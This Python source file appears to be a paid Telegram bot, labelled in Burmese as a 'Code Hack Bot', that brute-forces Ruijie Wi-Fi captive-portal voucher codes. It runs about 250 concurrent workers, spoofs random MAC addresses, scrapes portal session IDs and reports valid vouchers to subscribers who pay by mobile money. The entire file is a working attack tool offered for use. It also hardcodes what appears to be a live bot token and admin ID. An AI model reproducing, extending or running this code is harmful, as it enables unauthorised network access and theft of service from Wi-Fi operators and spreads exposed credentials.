#!/usr/bin/env python3
"""
Ruijie Wi-Fi Voucher Telegram Bot - Render Secure Env Version V15.1 (Turbo + Session ID View)
- Turbo Async Multi-Worker Engine (200 - 500+ req/sec)
- Real-time Session ID visual notification to User
- Fully supports Digit, Lower, Upper, and All Mix modes
- Supports 6, 7, 8 Length selection
- Render 100% Bug-Free Main Thread Fix
"""

import os
import re
import sys
import time
import random
import string
import base64
import asyncio
import logging
from datetime import datetime, timedelta

import aiohttp
from aiohttp import web
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# ==================== CONFIG (DIRECTLY CONFIG) ====================
# သင့်ရဲ့ Bot Token နဲ့ Admin ID ကို ဤနေရာတွင် တိုက်ရိုက်ထည့်သွင်းပေးထားပါသည်
BOT_TOKEN = "8940069213:AAFyrS1SRM0XaR3mT53o_HGSk2J-TCpsDqc"
ENV_ADMIN_ID = "6417845887"

try:
    admin_id = int(ENV_ADMIN_ID) if ENV_ADMIN_ID else None
except ValueError:
    admin_id = None

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== MEMORY STORAGE ====================
authorized_users = {} 
user_sessions = {}    
user_states = {}      

global_url_history = {}

# ==================== PER-USER SESSION ====================
class UserSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.portal_url = ""
        self.base_url = "http://192.168.110.1:2060"
        self.session_id = ""
        self.is_running = False
        self.stop_flag = False
        self.attempts = 0
        self.found_vouchers = [] 
        self.current_mode = "all"
        self.current_length = 6
        self.start_time = None
        self.in_running = set()
        self.concurrency_limit = 250  
        self.status_message_id = None

    def get_history_set(self):
        if not self.portal_url:
            return set()
        url_key = self.portal_url.split('?')[0] if '?' in self.portal_url else self.portal_url
        if url_key not in global_url_history:
            global_url_history[url_key] = set()
        return global_url_history[url_key]

def get_user_session(user_id):
    if user_id not in user_sessions:
        user_sessions[user_id] = UserSession(user_id)
    return user_sessions[user_id]

# ==================== HELPER FUNCTIONS ====================
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xFF) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in mac)

def replace_mac(url, new_mac):
    if "mac=" in url:
        return re.sub(r"mac=[^&]*", f"mac={new_mac}", url)
    return url + f"&mac={new_mac}"

async def get_session_id(http_session, session_url, previous_session_id):
    if not session_url:
        return previous_session_id
        
    url_match = re.search(r"[?&]sessionId=([a-zA-Z0-9\.\-_]+)", session_url)
    if url_match:
        return url_match.group(1).strip()
        
    if "ruijienetworks.com" in session_url:
        return "cloud_session_active"

    mac = get_mac()
    test_url = replace_mac(session_url, new_mac=mac)
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
    try:
        async with http_session.get(test_url, headers=headers, allow_redirects=True, timeout=3) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9\.\-_]+)", response)
            if session_id:
                return session_id.group(1)
            
            html = await req.text()
            sid_match = re.search(r'sessionId\s*[:=]\s*["\']([^"\']+)["\']', html)
            if sid_match:
                return sid_match.group(1)
    except:
        pass
    return previous_session_id

# ==================== RANDOM GENERATORS ====================
def generate_random_voucher(mode, length, history_set, in_running):
    if mode == "digit":
        chars = string.digits
    elif mode == "lower":
        chars = string.ascii_lowercase
    elif mode == "upper":
        chars = string.ascii_uppercase
    else:
        chars = string.digits + string.ascii_lowercase + string.ascii_uppercase

    while True:
        voucher = "".join(random.choices(chars, k=length))
        if voucher not in history_set and voucher not in in_running:
            return voucher

# ==================== LOGIN WORKER ====================
async def login_voucher_async(http_session, session_id, voucher, base_url, portal_url):
    if "ruijienetworks.com" in base_url:
        if "wifidog" in portal_url:
            login_url = portal_url.replace("stage=portal", "stage=login")
            if "voucher=" in login_url:
                login_url = re.sub(r'voucher=[^&]+', f'voucher={voucher}', login_url)
            else:
                login_url += f"&voucher={voucher}"
        else:
            login_url = f"{base_url}/api/auth/wifidog?stage=login&voucher={voucher}"
            
        mac = get_mac()
        login_url = replace_mac(login_url, new_mac=mac)
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Referer": portal_url}
        
        try:
            async with http_session.get(login_url, headers=headers, allow_redirects=False, timeout=1.5) as req:
                html = await req.text()
                success = ("success" in html.lower() or req.status in [302, 301])
                return voucher, success, html
        except:
            return voucher, False, ""
            
    else:
        if not session_id:
            return voucher, False, ""
        url = f"{base_url}/api/auth/voucher/"
        data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Redmi Note 13 Pro)",
        }
        try:
            async with http_session.post(url, json=data, headers=headers, ssl=False, timeout=1.5) as req:
                res_text = await req.text()
                success = ("logonUrl" in res_text or '"result":true' in res_text or '"code":0' in res_text)
                return voucher, success, res_text
        except:
            return voucher, False, ""

def parse_validity(response_text):
    for pattern in [r'"remainTime"\s*:\s*"?(\d+)"?', r'"validTime"\s*:\s*"?(\d+)"?']:
        match = re.search(pattern, response_text)
        if match:
            seconds = int(match.group(1))
            if seconds == 0: return "Unlimited"
            return f"{seconds // 3600} နာရီ {(seconds % 3600) // 60} မိနစ်"
    return "အကန့်အသတ်မရှိ"

# ==================== ACCESS CONTROLS ====================
def is_admin(user_id):
    return admin_id is not None and user_id == admin_id

def is_authorized(user_id):
    if is_admin(user_id): return True
    if user_id in authorized_users:
        info = authorized_users[user_id]
        if datetime.now() < info["expires"]:
            today = datetime.now().date()
            if info["last_reset"] != today:
                info["found_today"] = 0
                info["last_reset"] = today
            return True
        else:
            del authorized_users[user_id]
    return False

def get_remaining_daily(user_id):
    if is_admin(user_id): return 999999
    if user_id in authorized_users:
        info = authorized_users[user_id]
        return max(0, info["daily_limit"] - info["found_today"])
    return 0

# ==================== KEYBOARDS ====================
def admin_menu():
    return ReplyKeyboardMarkup(
        [
            ["🌐 Portal Link ထည့်သွင်းရန်", "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်"],
            ["📊 အခြေအနေ စစ်ဆေးရန်", "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်"],
            ["🏆 ရရှိထားသော Success Codes", "🗑️ Success Codes အားလုံးဖျက်ရန်"],
            ["👥 Admin ခွင့်ပြုထားသော Users", "🗑️ User ခွင့်ပြုချက် ပြန်ဖျက်ရန်"]
        ],
        resize_keyboard=True
    )

def user_menu():
    return ReplyKeyboardMarkup(
        [
            ["🌐 Portal Link ထည့်သွင်းရန်", "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်"],
            ["📊 အခြေအနေ စစ်ဆေးရန်", "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်"],
            ["🏆 ရရှိထားသော Success Codes", "🗑️ Success Codes အားလုံးဖျက်ရန်"]
        ],
        resize_keyboard=True
    )

def unauthorized_menu():
    return ReplyKeyboardMarkup(
        [["🔑 Access Key ဝယ်ယူရန်", "💵 Ngwe လွှဲပြေစာ ပေးပို့ရန်"]],
        resize_keyboard=True
    )

# ==================== ULTRA TURBO ENGINE ====================
async def worker(queue, http_session, us, history_set, bot, chat_id, user_id):
    while not us.stop_flag:
        voucher = await queue.get()
        if voucher is None:
            queue.task_done()
            break
        
        try:
            voucher, success, response_text = await login_voucher_async(
                http_session, us.session_id, voucher, us.base_url, us.portal_url
            )
            us.attempts += 1
            history_set.add(voucher)

            if success:
                validity = parse_validity(response_text)
                success_data = {
                    "code": voucher,
                    "time": datetime.now().strftime("%d-%m-%Y %H:%M:%S"),
                    "validity": validity
                }
                us.found_vouchers.append(success_data)
                if not is_admin(user_id) and user_id in authorized_users:
                    authorized_users[user_id]["found_today"] += 1

                await bot.send_message(
                    chat_id=chat_id,
                    text=f"🎉 **SUCCESS VOUCHER CODE တွေ့ရှိပါပြီ!** 🎉\n\n"
                         f"🔑 **Code:** `{voucher}`\n"
                         f"⏱ **သက်တမ်း:** {validity}\n"
                         f"📊 **စမ်းသပ်မှုအကြိမ်ရေ:** {us.attempts} ကြိမ်မြောက်တွင်တွေ့သည်",
                    parse_mode="Markdown"
                )
        except:
            pass
        finally:
            us.in_running.discard(voucher)
            queue.task_done()

async def high_speed_bruteforce(bot, chat_id, user_id):
    us = get_user_session(user_id)
    us.is_running = True
    us.stop_flag = False
    us.attempts = 0
    us.start_time = datetime.now()
    history_set = us.get_history_set()

    status_msg = await bot.send_message(
        chat_id=chat_id,
        text="⚡ **Turbo Engine ကို စတင်နှိုးနေပါပြီ...**\n⚙️ Portal Link မှ Session ID ကို ရှာဖွေစစ်ဆေးနေပါသည်...",
        parse_mode="Markdown"
    )
    us.status_message_id = status_msg.message_id

    connector = aiohttp.TCPConnector(limit=us.concurrency_limit, force_close=False, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=5)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as http_session:
        us.session_id = await get_session_id(http_session, us.portal_url, us.session_id)
        
        if not us.session_id:
            await bot.edit_message_text(
                chat_id=chat_id, message_id=us.status_message_id,
                text="❌ **Portal Link မှ Session ID ရယူ၍ မရနိုင်ပါ။ Link သက်တမ်းကုန်သွားခြင်း (သို့) မှားယွင်းနေခြင်း ဖြစ်နိုင်ပါသည်။**"
            )
            us.is_running = False
            return

        await bot.send_message(
            chat_id=chat_id,
            text=f"🔗 **Session Connected Successfully!**\n🔑 **Found Session ID:** `{us.session_id}`\n\n🚀 စမ်းသပ်ရှာဖွေမှုကို စတင်ပါပြီဗျာ။",
            parse_mode="Markdown"
        )

        queue = asyncio.Queue(maxsize=us.concurrency_limit * 2)
        workers = []
        for _ in range(us.concurrency_limit):
            task = asyncio.create_task(worker(queue, http_session, us, history_set, bot, chat_id, user_id))
            workers.append(task)

        last_ui_update = time.time()

        try:
            while not us.stop_flag:
                if not is_admin(user_id) and get_remaining_daily(user_id) <= 0:
                    break
                
                while queue.qsize() < us.concurrency_limit and not us.stop_flag:
                    v_code = generate_random_voucher(us.current_mode, us.current_length, history_set, us.in_running)
                    us.in_running.add(v_code)
                    await queue.put(v_code)
                
                now = time.time()
                if now - last_ui_update >= 3:
                    elapsed = now - time.mktime(us.start_time.timetuple())
                    speed = us.attempts / elapsed if elapsed > 0 else 0
                    try:
                        await bot.edit_message_text(
                            chat_id=chat_id, message_id=us.status_message_id,
                            text=f"⚡ **ကုဒ်များကို အရှိန်ပြင်းစွာ (Turbo Mode) ရှာဖွေနေပါသည်...**\n\n"
                                 f"🔑 **Active Session:** `{us.session_id[:20]}...`\n"
                                 f"📊 **ရှာပြီး:** {us.attempts} ကြိမ်\n"
                                 f"⚡ **အမြန်နှုန်း:** {speed:.1f} req/sec\n"
                                 f"🏆 **တွေ့ရှိမှု:** {len(us.found_vouchers)} ခု",
                        )
                    except:
                        pass
                    last_ui_update = now

                await asyncio.sleep(0.01)

        finally:
            us.stop_flag = True
            for _ in range(us.concurrency_limit):
                await queue.put(None)
            await asyncio.gather(*workers, return_exceptions=True)

    us.is_running = False
    try:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=us.status_message_id,
            text=f"⏹ **စမ်းသပ်မှုကို ရပ်တန့်လိုက်ပါပြီ။**\n\n📊 စုစုပေါင်းစမ်းသပ်မှု: {us.attempts} ကြိမ်\n🏆 Success ရရှိမှု: {len(us.found_vouchers)} ခု"
        )
    except:
        pass

# ==================== HANDLERS ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        await update.message.reply_text("👑 **Admin Panel မှ ကြိုဆိုပါသည် လူကြီးမင်း။**", reply_markup=admin_menu())
    elif is_authorized(user_id):
        await update.message.reply_text("✅ **လူကြီးမင်းတွင် Bot အသုံးပြုခွင့် ရှိပါသည်။**", reply_markup=user_menu())
    else:
        await update.message.reply_text(f"👋 **မင်္ဂလာပါ! ကွန်ရက် Voucher စမ်းသပ်စစ်ဆေးရေး Bot ဖြစ်ပါတယ်။**\n\n🚫 လူကြီးမင်းမှာ အသုံးပြုခွင့် Key မရှိသေးပါသည်။ ဆက်သွယ်ဝယ်ယူနိုင်ပါသည်။\n🆔 သင့် ID: `{user_id}`", reply_markup=unauthorized_menu(), parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    state = user_states.get(user_id)

    if not is_authorized(user_id) and not is_admin(user_id):
        if text == "🔑 Access Key ဝယ်ယူရန်":
            await update.message.reply_text(
                "💎 **Code Hack Bot အသုံးပြုခွင့် နှုန်းထားများ** 💎\n\n"
                "📱 **KBZPay / Wave Money** ဖြင့် ဝယ်ယူနိုင်ပါသည်။\n"
                "💡 Ngwe လွှဲပြီးပါက အောက်က 'ငွေလွှဲပြေစာ ပေးပို့ရန်' ခလုတ်ကိုနှိပ်ပြီး ပြေစာပုံ ပို့ပေးပါ။",
                reply_markup=unauthorized_menu()
            )
        elif text == "💵 Ngwe လွှဲပြေစာ ပေးပို့ရန်":
            user_states[user_id] = "waiting_receipt"
            await update.message.reply_text("📸 **ငွေလွှဲပြီးကြောင်း ပြေစာ Screenshot (ဓာတ်ပုံ) အား ပေးပို့ပေးပါ။**")
        return

    if is_admin(user_id) and state == "waiting_approve":
        user_states.pop(user_id, None)
        try:
            parts = text.strip().split("|")
            t_id = int(parts[0].strip())
            days = int(parts[1].strip())
            limit = int(parts[2].strip())
            
            authorized_users[t_id] = {
                "expires": datetime.now() + timedelta(days=days),
                "daily_limit": limit,
                "found_today": 0,
                "last_reset": datetime.now().date(),
            }
            await update.message.reply_text(f"✅ အောင်မြင်ပါသည်! User: `{t_id}` ကို ခွင့်ပြုလိုက်ပါပြီ။", reply_markup=admin_menu())
            return
        except:
            await update.message.reply_text("❌ ပုံစံမှားယွင်းနေပါသည်။", reply_markup=admin_menu())
            return

    if state == "waiting_portal_link":
        user_states.pop(user_id, None)
        us = get_user_session(user_id)
        us.portal_url = text.strip()
        
        host_match = re.search(r'(https?://[^/]+)', us.portal_url)
        if host_match:
            base_domain = host_match.group(1)
            if "ruijienetworks.com" in base_domain:
                us.base_url = base_domain
            else:
                if ":" in base_domain.replace("http://", "").replace("https://", ""):
                    us.base_url = base_domain
                else:
                    us.base_url = f"{base_domain}:2060"
        else:
            us.base_url = "https://portal-as.ruijienetworks.com"
            
        await update.message.reply_text(
            f"✅ **Portal Link ကို မှတ်သားပြီးပါပြီ!**\n\n"
            f"🌐 **Link:** {us.portal_url}\n"
            f"📡 **Detected Base:** {us.base_url}", 
            reply_markup=admin_menu() if is_admin(user_id) else user_menu()
        )
        return

    if text == "🌐 Portal Link ထည့်သွင်းရန်":
        user_states[user_id] = "waiting_portal_link"
        await update.message.reply_text("🔗 **လူကြီးမင်း၏ Wi-Fi Portal Login Link အား Copy ကူး၍ ပို့ပေးပါ။**")
    
    elif text == "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်":
        us = get_user_session(user_id)
        if not us.portal_url:
            await update.message.reply_text("⚠️ **ကျေးဇူးပြု၍ Portal Link ကို အရင်ထည့်သွင်းပေးပါဦး။**")
            return
        if us.is_running:
            await update.message.reply_text("⚠️ **လက်ရှိတွင် ရှာဖွေမှု ပြုလုပ်နေဆဲဖြစ်ပါသည်။**")
            return
            
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("🔢 ဂဏန်းသီးသန့် (Digit)", callback_data="mode_digit")],
                [InlineKeyboardButton("🔤 စာလုံးအသေးသီးသန့် (Lower)", callback_data="mode_lower")],
                [InlineKeyboardButton("🔤 စာလုံးအကြီးသီးသန့် (Upper)", callback_data="mode_upper")],
                [InlineKeyboardButton("🔣 အလုံးစုံကုဒ် (All Mix)", callback_data="mode_all")]
            ]
        )
        await update.message.reply_text("⚙️ **စမ်းသပ်မည့် ကုဒ်အမျိုးအစား (Voucher Mode) ရွေးချယ်ပါ -**", reply_markup=keyboard)

    elif text == "📊 အခြေအနေ စစ်ဆေးရန်":
        us = get_user_session(user_id)
        status = "🟢 အလုပ်လုပ်နေသည်" if us.is_running else "🔴 ရပ်တန့်ထားသည်"
        await update.message.reply_text(
            f"📊 **လက်ရှိ Bot လုပ်ဆောင်မှုအခြေအနေ**\n\n"
            f"📡 အခြေအနေ: {status}\n"
            f"🔢 ယခု Session စမ်းသပ်ပြီး: {us.attempts} ကြိမ်\n"
            f"🏆 တွေ့ရှိမှု: {len(us.found_vouchers)} ခု",
            reply_markup=admin_menu() if is_admin(user_id) else user_menu()
        )

    elif text == "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်":
        us = get_user_session(user_id)
        if us.is_running:
            us.stop_flag = True
            await update.message.reply_text("⏳ **လုပ်ငန်းစဉ်ကို ရပ်တန့်ရန် အမိန့်ပေးပို့လိုက်ပါပြီ...**")
        else:
            await update.message.reply_text("❌ လက်ရှိတွင် မည်သည့်ရှာဖွေမှုမှ ပြုလုပ်မနေပါ။")

    elif text == "🏆 ရရှိထားသော Success Codes":
        us = get_user_session(user_id)
        if not us.found_vouchers:
            await update.message.reply_text("ℹ️ **မည်သည့် Success Code မှ မတွေ့ရှိရသေးပါခင်ဗျာ။**")
            return
        msg = "🏆 **Corporate Success Voucher Codes** 🏆\n\n"
        for idx, v in enumerate(us.found_vouchers, 1):
            msg += f"{idx}။ 🔑 ကုဒ်: `{v['code']}` | သက်တမ်း: {v['validity']}\n"
        await update.message.reply_text(msg, parse_mode="Markdown")

    elif text == "🗑️ Success Codes အားလုံးဖျက်ရန်":
        us = get_user_session(user_id)
        us.found_vouchers.clear()
        await update.message.reply_text("🗑️ **အောင်မြင်စွာ ဖျက်သိမ်းပြီးပါပြီ။**")

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_states.get(user_id) == "waiting_receipt":
        user_states.pop(user_id, None)
        await update.message.reply_text("✅ **ပြေစာကို Admin ထံသို့ ပေးပို့လိုက်ပါပြီ။**")

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    chat_id = query.message.chat_id

    if data.startswith("mode_"):
        mode = data.replace("mode_", "")
        us = get_user_session(user_id)
        us.current_mode = mode
        
        keyboard = InlineKeyboardMarkup(
            [[
                InlineKeyboardButton("6 လုံး", callback_data="len_6"),
                InlineKeyboardButton("7 လုံး", callback_data="len_7"),
                InlineKeyboardButton("8 လုံး", callback_data="len_8")
            ]]
        )
        await query.edit_message_text(text=f"🔢 **Voucher ၏ Сာလုံးအရှည် (Length) ကို ရွေးချယ်ပါ -**", reply_markup=keyboard)

    elif data.startswith("len_"):
        length = int(data.replace("len_", ""))
        us = get_user_session(user_id)
        us.current_length = length
        
        await query.edit_message_text(text=f"🚀 **Ultimate Turbo အင်ဂျင်ကို နှိုးနေပါပြီ...**")
        asyncio.create_task(high_speed_bruteforce(context.bot, chat_id, user_id))

# ==================== WEB SERVER FOR RENDER ====================
async def health_check(request):
    return web.Response(text="Aladdin Bot Server is 100% Live and Stable!")

async def main():
    if not BOT_TOKEN:
        logger.error("CRITICAL: BOT_TOKEN is missing!")
        sys.exit(1)

    app_tg = Application.builder().token(BOT_TOKEN).build()
    app_tg.add_handler(CommandHandler("start", start_command))
    app_tg.add_handler(CallbackQueryHandler(handle_callback))
    app_tg.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app_tg.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    await app_tg.initialize()
    await app_tg.start()
    await app_tg.updater.start_polling(drop_pending_updates=True)
    logger.info("Telegram Bot Started via Polling Mode.")

    app_web = web.Application()
    app_web.router.add_get('/', health_check)
    
    port = int(os.environ.get("PORT", 8080))
    runner = web.AppRunner(app_web)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    try:
        while True:
            await asyncio.sleep(3600)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        await app_tg.updater.stop()

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())